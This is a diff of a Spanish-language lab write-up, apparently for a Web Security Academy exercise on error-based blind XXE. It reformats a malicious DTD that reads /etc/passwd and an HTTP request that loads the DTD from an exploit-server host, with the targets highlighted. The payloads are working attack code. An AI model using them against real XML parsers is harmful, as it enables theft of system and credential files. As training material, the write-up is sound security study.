@@ -20,12 +20,13 @@ tags:
 ## Cómo explotarlo (3 partes)
 
 ### 1. El DTD malicioso — qué debe contener
-```dtd
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+
+> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/exploit) + el **objetivo** del ataque (archivo/URL/entidad).
+
+<pre><code>&lt;!ENTITY % file SYSTEM "<mark>file:///etc/passwd</mark>"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
 %eval;
-%error;
-```
+%error;</code></pre>
 - `%file` → lee `/etc/passwd`.
 - `%error` → apunta a `file:///nonexistent/<contenido>` → el parser **falla y filtra el contenido**.
 - `&#x25;` = `%` escapado (igual que en 006).
@@ -34,15 +35,13 @@ tags:
 File `/exploit.dtd`, Body = el DTD, **Store** → `https://EXPLOIT.exploit-server.net/exploit.dtd`.
 
 ### 3. La request que carga el DTD
-```http
-POST /product/stock HTTP/1.1
-Host: TARGET.web-security-academy.net
+<pre><code>POST /product/stock HTTP/1.1
+Host: <mark>TARGET.web-security-academy.net</mark>
 Content-Type: application/xml
 
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://EXPLOIT.exploit-server.net/exploit.dtd"> %xxe;]>
-<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
-```
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "https://<mark>EXPLOIT.exploit-server.net</mark>/exploit.dtd"&gt; %xxe;]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</code></pre>
 
 ## Verificación
 La **respuesta HTTP** trae:
